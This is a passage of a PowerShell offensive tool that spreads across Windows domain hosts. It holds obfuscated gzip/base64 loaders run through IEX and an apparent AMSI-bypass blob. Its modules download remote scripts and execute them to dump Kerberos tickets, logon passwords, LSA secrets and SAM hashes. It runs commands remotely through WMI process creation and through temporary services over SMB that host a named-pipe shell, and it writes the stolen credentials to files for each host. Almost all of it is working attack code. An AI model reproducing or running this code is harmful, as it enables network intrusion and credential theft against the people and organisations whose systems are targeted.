i5VQlvu4CNwSkfbXLVCvSPthGJkDy7QHNsRpC6H7zzU3LmbUi+wkgzcZUZL29/d5Tzgjg5Dqhv3H+v8A9eh9jGkfAAA=";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

$Mongoose = @'
Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@


################################################################################################################
######################################## Command and Module logic ## ###########################################
################################################################################################################

# Tickets
if ($Module -eq "Tickets"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Tickets - KerbDump
if ($Module -eq "KerbDump"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LogonPasswords
elseif ($Module -eq "LogonPasswords"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# eKeys
elseif ($Module -eq "ekeys"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LSA
elseif ($Module -eq "LSA"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# SAM
elseif ($Module -eq "SAM"){
$b64 = "$LocalSAM"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Disks
elseif ($Module -eq "disks"){
$b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# LoggedOnUsers
elseif ($Module -eq "LoggedOnUsers"){
$b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# Sessions
elseif ($Module -eq "Sessions"){
$b64 = "Write-host; query user | Out-String"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# ConsoleHistory
elseif ($Module -eq "ConsoleHistory"){
$b64 = "$ConsoleHostHistory"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Files
elseif ($Module -eq "Files"){
$b64 = "$Files"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

elseif ($Module -eq "" -and $Command -ne ""){
$base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
$Command = "powershell.exe -ep bypass -enc $base64Command"
}


################################################################################################################
################################# Logic to help keep output tidy and even ######################################
################################################################################################################

if ($Method -ne "Spray"){
$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
}

################################################################################################################
################################################ Function: WMI #################################################
################################################################################################################
Function Method-WMIexec {
param ($ComputerName)
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList


$scriptBlock = {
    param ($computerName, $Command, $Username, $Password, $LocalAuth)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect"}


    
    Function LocalWMI {

param (
    [string]$Command = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$ComputerName = "",
    [switch]$LocalAuth = $true,
    [string]$Class = "PMEClass"
)

$LocalUsername = "$ComputerName\$UserName"
$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
$osInfo = $null

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue" -Credential $cred
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}


#Check access
$ErrorActionPreference = "silentlycontinue"
$osInfo = $null  # Reset $osInfo variable before each iteration

# OSinfo
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred

# If OSinfo true and command empty
if ($osinfo -and $Command -eq ""){
$result =  "Reminder to move this outside of runspace"
return $result

}

# If OSinfo true and command not empty
elseif ($osinfo -and $Command -ne ""){

if ($LocalAuth){	
	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
    
    if (!$classCheck) {Write-Host "ClassCheck"
$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="


$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred



# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
Start-Sleep -Seconds "10"
    
    }
    elseif ($classCheck -ne $null){
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred

    
    $wmiInstance.GetType() | Out-Null
    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
    $wmiInstance.Dispose()
    return $CommandId
    }
}

$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth


function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    try {
            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
        
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {
        Write-Host "Failed"
        #Write-Error $_.Exception.Message
    } 
    finally {
        if ($wmiInstance) {
            $wmiInstance.Dispose()
        }
    }
}

function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
    
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
 
    if ($process.ReturnValue -eq 0) {
        $started = Get-Date
        Do {
            if ($started.AddMinutes(2) -lt (Get-Date)) {
                Write-Host "PID: $($process.ProcessId) - Response took too long."
                break
            }
    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
            
            Start-Sleep -Seconds 1
        } While ($watcher -ne $null)
        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
        return $scriptOutput
    }
}

$commandString = $Command
$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
if ($scriptCommandId -eq $null) {
    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
}
$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
return $result
}



}

elseif (!$osinfo){
    if ($SuccessOnly){return} 
        elseif (!$SuccessOnly) {

               return "Access Denied"
            }
        }
}
    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
    
    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}

if ($Command -ne ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"}
}

function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}
    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix "WMI"
    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

     # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f "") -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
# Filter non-candidate systems before wasting processing power on creating runspaces
foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]


        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }




# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################## Function: SMB ################################################
################################################################################################################
Function Method-SMB{
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param($ComputerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }   
    
$SMBCheck = $false
$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

if (!$SMBCheck) {
    return "Access Denied"
}

if ([string]::IsNullOrWhiteSpace($Command)) {
    return "Successful connection PME"
}




    
    function Enter-SMBSession {

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "45000"
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	Start-Sleep -Milliseconds 2000
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		return "Timed Out"

	} catch {
		Write-Output "unexpected error"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command 2>&1 | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
    return Enter-SMBSession -ComputerName $ComputerName -Command $Command




}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unexpected Error") {
                if ($successOnly) { continue }
